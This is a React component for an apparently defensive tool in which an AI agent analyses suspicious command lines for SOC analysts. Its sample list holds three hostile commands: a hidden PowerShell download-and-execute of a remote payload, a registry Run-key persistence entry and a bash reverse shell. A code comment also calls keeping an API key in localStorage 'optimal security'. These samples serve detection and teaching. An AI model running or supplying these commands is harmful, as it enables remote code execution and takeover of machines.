/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from "react";
import { Sparkles, Terminal, AlertTriangle, ShieldCheck, Clipboard, Check, Play, MessageSquare, Send, ShieldAlert, Cpu } from "lucide-react";

interface CommandAnalysis {
  purpose: string;
  severity: "Safe" | "Informational" | "Low" | "Medium" | "High" | "Critical";
  riskExplanation: string;
  parameters: {
    part: string;
    meaning: string;
    risk: string;
  }[];
  mitreMappings: {
    tactic: string;
    techniqueId: string;
    techniqueName: string;
  }[];
  obfuscationDetected: boolean;
  obfuscationDetails: string;
  remediation: string;
}

interface Message {
  role: "user" | "assistant";
  content: string;
}

export default function AiCommandInterpreterView() {
  const [command, setCommand] = useState("");
  const [loading, setLoading] = useState(false);
  const [analysis, setAnalysis] = useState<CommandAnalysis | null>(null);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
  const [copiedText, setCopiedText] = useState(false);
  const [apiError, setApiError] = useState("");

  const [followUp, setFollowUp] = useState("");
  const [chatHistory, setChatHistory] = useState<Message[]>([]);
  const [chatLoading, setChatLoading] = useState(false);

  const sampleCommands = [
    {
      label: "PowerShell Payload Download",
      command: "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8:80/payload.ps1')\""
    },
    {
      label: "Registry Persistence Entry",
      command: "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityAutoUpdate\" /t REG_SZ /d \"C:\\Users\\Public\\Update.bat\" /f"
    },
    {
      label: "Linux Reverse Shell Setup",
      command: "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
    }
  ];

  const handleSelectSample = (sample: string) => {
    setCommand(sample);
  };

  const handleAnalyze = async () => {
    if (!command.trim()) return;
    setLoading(true);
    setApiError("");
    setAnalysis(null);
    setChatHistory([]); // reset chat for a new command session

    try {
      // Get stored credentials/API keys from localStorage for optimal security
      const geminiKey = localStorage.getItem("GEMINI_API_KEY") || "";

      const response = await fetch("/api/analyze/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command,
          apiKeys: {
            gemini: geminiKey
          }
        })
      });

      if (!response.ok) {
        throw new Error(`Failed to communicate with AI core (Status ${response.status})`);
      }

      const data = await response.json();
      if (data.error) {
        throw new Error(data.error);
      }
      setAnalysis(data);
    } catch (err: any) {
      console.error(err);
      setApiError(err.message || "An error occurred while analyzing the command execution line.");
    } finally {
      setLoading(false);
    }
  };

  const handleAskQuery = async () => {
    if (!followUp.trim() || !analysis) return;
    const userMsg = followUp;
    setFollowUp("");
    setChatHistory(prev => [...prev, { role: "user", content: userMsg }]);
    setChatLoading(true);

    try {
      const geminiKey = localStorage.getItem("GEMINI_API_KEY") || "";
      const response = await fetch("/api/analyze/command/query", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command,
          contextAnalysis: analysis,
          chatHistory: [...chatHistory, { role: "user", content: userMsg }],
          query: userMsg,
          apiKey: geminiKey
        })
      });

      if (!response.ok) {
        throw new Error("Failed to get response from AI Agent");
      }

      const data = await response.json();
      setChatHistory(prev => [...prev, { role: "assistant", content: data.answer }]);
    } catch (err: any) {
      setChatHistory(prev => [...prev, { role: "assistant", content: `Agent Error: ${err.message || "Failed to process chat query."}` }]);
    } finally {
      setChatLoading(false);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(command);
    setCopiedText(true);
    setTimeout(() => setCopiedText(false), 1800);
  };

  const getSeverityBadge = (sev?: string) => {
    switch (sev) {
      case "Critical":
        return <span className="bg-red-950 text-red-400 border border-red-500/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider animate-pulse">Critical Severity</span>;
      case "High":
        return <span className="bg-orange-950 text-orange-400 border border-orange-550/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider">High Severity</span>;
      case "Medium":
        return <span className="bg-yellow-950 text-yellow-400 border border-yellow-500/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider">Medium Severity</span>;
      case "Low":
        return <span className="bg-blue-950 text-blue-400 border border-blue-500/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider font-mono">Low</span>;
      case "Safe":
        return <span className="bg-emerald-950 text-emerald-405 border border-emerald-500/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider font-mono">Safe</span>;
      default:
        return <span className="bg-slate-950 text-slate-400 border border-slate-700/30 text-[10px] uppercase font-bold px-2 py-0.5 rounded tracking-wider font-mono">Informational</span>;
    }
  };

  return (
    <div className="space-y-6">
      {/* Visual Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-900 pb-5 gap-3">
        <div>
          <div className="flex items-center gap-2">
            <Sparkles className="w-5 h-5 text-red-500 animate-pulse" />
            <h2 className="text-lg font-mono font-bold tracking-tight text-slate-100 uppercase">
              AI Command Interpreter Agent
            </h2>
          </div>
          <p className="text-xs text-slate-500 font-mono mt-1">
            Deconstruct malicious script payload execution logs, cmdlines, PowerShell scripts, and Bash processes instantly.
          </p>
        </div>
      </div>

      {/* WARNING BANNER: MUST display BEFORE posting the command line to check if any company related data is present and mask those */}
      <div className="bg-amber-950/20 border border-amber-900/60 rounded-lg p-4 flex gap-3 text-amber-300">
        <AlertTriangle className="w-5 h-5 shrink-0 text-amber-500 mt-0.5" />
        <div className="font-mono text-xs leading-relaxed">
          <span className="font-bold block uppercase text-amber-500 tracking-wider mb-0.5 flex items-center gap-1.5">
            Security Warning // Mask Sensitive Information
          </span>
          Beware before posting the command line to check if any company related data is present and mask those and ask queries. Ensure hostnames, credentials, keys, private emails, and organizational names are genericized.
        </div>
      </div>

      {/* Main Terminal Grid Input */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-4">
          <div className="bg-slate-955 border border-slate-900 rounded-lg p-5">
            <div className="flex items-center justify-between mb-3.5">
              <span className="text-[10px] font-mono font-bold text-slate-400 tracking-wider flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 text-slate-500" />
                COMMAND EXECUTABLE INPUT AREA
              </span>
              <div className="flex gap-2">
                {command && !loading && (
                  <button
                    onClick={handleCopy}
                    className="p-1 px-2.5 rounded bg-slate-950 border border-slate-900 hover:text-slate-200 text-slate-450 text-[10px] font-mono flex items-center gap-1 transition"
                  >
                    {copiedText ? (
                      <>
                        <Check className="w-3 h-3 text-emerald-450" />
                        COPIED
                      </>
                    ) : (
                      <>
                        <Clipboard className="w-3 h-3" />
                        COPY
                      </>
                    )}
                  </button>
                )}
              </div>
            </div>

            <textarea
              className="w-full h-32 bg-slate-1000 border border-slate-900 rounded-md p-3.5 font-mono text-xs text-slate-350 focus:outline-none focus:border-red-650 resize-none placeholder:text-slate-700 leading-normal"
              placeholder="Paste raw shell scripts, complex obfuscated CLI execution arguments, CMD string lines, nested payload downloads..."
              value={command}
              onChange={(e) => setCommand(e.target.value)}
            />

            <div className="flex flex-col sm:flex-row justify-between items-stretch sm:items-center mt-3.5 gap-3.5">
              <div className="flex flex-wrap gap-2">
                {sampleCommands.map((sample, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleSelectSample(sample.command)}
                    className="text-[10.5px] font-mono bg-slate-950 border border-slate-900 hover:border-slate-800 text-slate-400 hover:text-slate-250 px-2.5 py-1 rounded transition text-left"
                  >
                    {sample.label}
                  </button>
                ))}
              </div>

              <button
                type="button"
                onClick={handleAnalyze}
                disabled={loading || !command.trim()}
                className={`flex items-center justify-center gap-1.5 px-5 py-2 rounded font-mono text-xs font-bold uppercase shrink-0 transition ${
                  loading || !command.trim()
                    ? "bg-slate-900 text-slate-650 cursor-not-allowed border border-slate-850"
                    : "bg-red-650 hover:bg-red-700 text-white cursor-pointer"
                }`}
              >
                {loading ? (
                  <>
                    <Cpu className="w-3.5 h-3.5 animate-spin" />
                    DECONSTRUCTING PAYLOAD...
                  </>
                ) : (
                  <>
                    <Play className="w-3 h-3 text-white" />
                    DECONSTRUCT COMMAND
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Error display */}
          {apiError && (
            <div className="bg-red-950/25 border border-red-900 rounded p-4 font-mono text-xs text-red-400">
              {apiError}
            </div>
          )}

          {/* Analysis View Results */}
          {analysis && (
            <div className="bg-slate-955 border border-slate-900 rounded-lg p-5 space-y-6">
              {/* Overall Summary block */}
              <div className="flex flex-col md:flex-row justify-between items-start border-b border-slate-900 pb-4 gap-4">
                <div className="space-y-1 flex-1">
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-mono font-bold text-slate-500 tracking-wider">
                      COMMAND FUNCTIONAL DIRECTIVE
                    </span>
                    {getSeverityBadge(analysis.severity)}
                  </div>
                  <h3 className="text-sm font-semibold text-slate-200 mt-1 select-all font-mono leading-relaxed">
                    {analysis.purpose}
                  </h3>
                </div>
              </div>

              {/* Forensic Details */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-slate-1000 p-3.5 border border-slate-900 rounded font-mono text-xs">
                  <span className="text-[10px] text-slate-500 font-bold block mb-1">
                    THREAT RISK EXPLANATION
                  </span>
                  <p className="text-slate-350 leading-relaxed text-[11px]">{analysis.riskExplanation}</p>
                </div>

                <div className="bg-slate-1000 p-3.5 border border-slate-900 rounded font-mono text-xs">
                  <span className="text-[10px] text-slate-500 font-bold block mb-1">
                    OBFUSCATION / DECODER ANALYSIS
                  </span>
                  {analysis.obfuscationDetected ? (
                    <div className="space-y-1.5 mt-0.5">
                      <span className="text-[10px] bg-yellow-950/40 text-yellow-500 px-2 py-0.5 rounded border border-yellow-900/50 uppercase font-bold inline-block">
                        Obfuscation Detected
                      </span>
                      <p className="text-slate-350 leading-relaxed text-[11px]">{analysis.obfuscationDetails}</p>
                    </div>
                  ) : (
                    <div className="text-slate-500 mt-1 flex items-center gap-1.5 text-[11px]">
                      <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
                      No complex obfuscation matrices detected in original command lines.
                    </div>
                  )}
                </div>
              </div>

              {/* Parameter Decomposition */}
              <div className="space-y-3">
                <h4 className="text-[10.5px] font-mono font-bold text-slate-400 tracking-wider uppercase">
                  Parameter & Parameter Value Deconstruction
                </h4>

                <div className="border border-slate-900 rounded overflow-hidden">
                  <table className="w-full text-left font-mono text-[11px]">
                    <thead>
                      <tr className="bg-slate-1000 text-slate-500 border-b border-slate-900 select-all">
                        <th className="p-3 w-1/3">Argument / Parameter</th>
                        <th className="p-3">Interpretation</th>
                        <th className="p-3 text-right">Risk Score</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-900/60 font-mono">
                      {analysis.parameters && analysis.parameters.map((param, index) => (
                        <tr key={index} className="hover:bg-slate-1000/20">
                          <td className="p-3 font-semibold text-red-450 break-all select-all">
                            {param.part}
                          </td>
                          <td className="p-3 text-slate-350 leading-relaxed">
                            {param.meaning}
                          </td>
                          <td className="p-3 text-right">
                            <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
                              param.risk.toLowerCase().includes("bypass") || param.risk.toLowerCase().includes("malicious") || param.risk.toLowerCase().includes("high")
                                ? "bg-red-950/40 text-red-400 border border-red-900/40"
                                : "bg-slate-950 text-slate-500 border border-slate-900"
                            }`}>
                              {param.risk}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* MITRE ATT&CK Mapping & Remediation */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-slate-1000 p-4 border border-slate-900 rounded font-mono text-xs">
                  <span className="text-[10px] text-slate-500 font-bold block mb-2 uppercase">
                    MITRE ATT&CK TACTICS & TECHNIQUES
                  </span>
                  {analysis.mitreMappings && analysis.mitreMappings.length > 0 ? (
                    <div className="space-y-2 mt-1">
                      {analysis.mitreMappings.map((m, idx) => (
                        <div key={idx} className="flex flex-col bg-slate-955 p-2 rounded border border-slate-900 gap-1">
                          <div className="flex justify-between items-center text-[10.5px]">
                            <span className="text-red-450 font-bold bg-slate-1000 px-1.5 py-0.5 rounded border border-slate-900">{m.techniqueId}</span>
                            <span className="text-slate-550 uppercase text-[9px] font-bold">{m.tactic}</span>
                          </div>
                          <span className="text-slate-300 font-sans font-medium text-[11px] leading-tight mt-0.5">{m.techniqueName}</span>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="text-slate-600 text-[11px]">No standard malicious MITRE mappings defined for this scope.</div>
                  )}
                </div>

                <div className="bg-slate-1000 p-4 border border-slate-900 rounded font-mono text-xs">
                  <span className="text-[10px] text-slate-500 font-bold block mb-1">
                    SOC MITIGATION & DEFENSE REMEDIATION
                  </span>
                  <p className="text-slate-350 leading-relaxed text-[11px] whitespace-pre-line mt-1">{analysis.remediation}</p>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Sidebar conversational Q&A block */}
        <div className="lg:col-span-1 space-y-4">
          <div className="bg-slate-955 border border-slate-900 rounded-lg p-4 flex flex-col h-[520px]">
            <span className="text-[10px] font-mono font-bold text-slate-500 tracking-wider flex items-center gap-2 mb-3">
              <MessageSquare className="w-3.5 h-3.5 text-slate-400" />
              INTERACTIVE AGENT WORKSPACE
            </span>

            {/* Chat Body panel */}
            <div className="flex-1 bg-slate-1000/60 border border-slate-900/60 rounded-md p-3.5 overflow-y-auto space-y-3 font-mono text-xs scrollbar-thin select-text">
              {!analysis ? (
                <div className="h-full flex flex-col items-center justify-center text-center text-slate-650 p-4 space-y-2">
                  <Cpu className="w-8 h-8 text-slate-800" />
                  <p className="text-[11px] leading-normal font-medium">
                    Analysis results are currently unpopulated. Complete the threat payload deconstruction to boot up follow-up chat queries with the AI Agent.
                  </p>
                </div>
              ) : chatHistory.length === 0 ? (
                <div className="text-slate-500 text-[11.5px] p-2 leading-relaxed space-y-2">
                  <p className="font-semibold text-slate-400 flex items-center gap-1.5">
                    <Sparkles className="w-3.5 h-3.5 text-red-500 shrink-0" />
                    Interactive Chat Booted
                  </p>
                  <p>
                    Ask any deep forensic security questions about this execution script now!
                  </p>
                  <div className="space-y-1.5 text-[10.5px]">
                    <p className="text-slate-605">Try asking:</p>
                    <button
                      type="button"
                      onClick={() => setFollowUp("Is this part of a specific known APT malware operation?")}
                      className="block text-left text-red-405 hover:underline"
                    >
                      "Is this part of a specific known APT malware operation?"
                    </button>
                    <button
                      type="button"
                      onClick={() => setFollowUp("Can you write a YARA detection rule to hunt for this command script?")}
                      className="block text-left text-red-405 hover:underline"
                    >
                      "Can you write a YARA detection rule to hunt for this command script?"
                    </button>
                  </div>
                </div>
              ) : (
                chatHistory.map((msg, index) => (
                  <div
                    key={index}
                    className={`p-2.5 rounded border border-slate-900/40 text-[11px] leading-normal ${
                      msg.role === "user"
                        ? "bg-slate-900 text-slate-200 border-l-2 border-l-slate-600 ml-4"
                        : "bg-slate-950 text-slate-350 border-l-2 border-l-red-500"
                    }`}
                  >
                    <span className="text-[9px] font-bold text-slate-550 block mb-1 uppercase">
                      {msg.role === "user" ? "SOC Analyst" : "AI Cyber Security Agent"}
                    </span>
                    <span className="whitespace-pre-wrap">{msg.content}</span>
                  </div>
                ))
              )}

              {chatLoading && (
                <div className="flex items-center gap-2 text-slate-500 text-[10.5px] py-1">
                  <div className="w-1.5 h-1.5 rounded-full bg-slate-500 animate-bounce" />
                  <div className="w-1.5 h-1.5 rounded-full bg-slate-500 animate-bounce delay-75" />
                  <div className="w-1.5 h-1.5 rounded-full bg-slate-500 animate-bounce delay-150" />
                  <span>Agent is reasoning...</span>
                </div>
              )}
            </div>

            {/* Chat Input form */}
            <div className="mt-3 flex gap-2">
              <input
                type="text"
                className="flex-1 bg-slate-1000 border border-slate-900 rounded px-3 py-2 font-mono text-xs text-slate-400 placeholder:text-slate-700 outline-none focus:border-red-650"
                placeholder={analysis ? "Ask a cyber agent follow-up query..." : "Awaiting cmd analysis..."}
                value={followUp}
                onChange={(e) => setFollowUp(e.target.value)}
                disabled={!analysis || chatLoading}
                onKeyDown={(e) => e.key === "Enter" && handleAskQuery()}
              />
              <button
                type="button"
                onClick={handleAskQuery}
                disabled={!analysis || chatLoading || !followUp.trim()}
                className={`p-2.5 rounded flex items-center justify-center border transition font-mono ${
                  !analysis || chatLoading || !followUp.trim()
                    ? "bg-slate-900 text-slate-700 border-slate-900 cursor-not-allowed"
                    : "bg-slate-950 text-red-505 border-slate-900 hover:text-slate-200 cursor-pointer"
                }`}
              >
                <Send className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
